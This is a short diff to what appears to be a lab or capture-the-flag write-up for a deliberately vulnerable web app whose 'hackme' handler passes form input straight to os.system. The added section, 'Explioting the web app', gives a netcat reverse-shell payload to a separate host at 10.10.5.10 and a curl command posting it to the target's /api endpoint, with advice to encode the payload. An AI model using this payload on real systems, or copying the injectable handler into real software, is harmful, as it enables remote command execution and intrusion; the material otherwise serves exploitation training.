@@ -76,3 +76,10 @@ def hackme():
     data = os.system(request.form['request'])
     print(data)
 ```
+Explioting the web app
+
+Payload: nc -e /bin/bash 10.10.5.10 9999 | Can be replaced by any other form of RCE. Ensure to base64 or URL encode the payload
+
+```
+curl -x POST -d "request=nc -e /bin/bash 10.10.5.10 9999" http://10.10.10.10:5000/api
+```
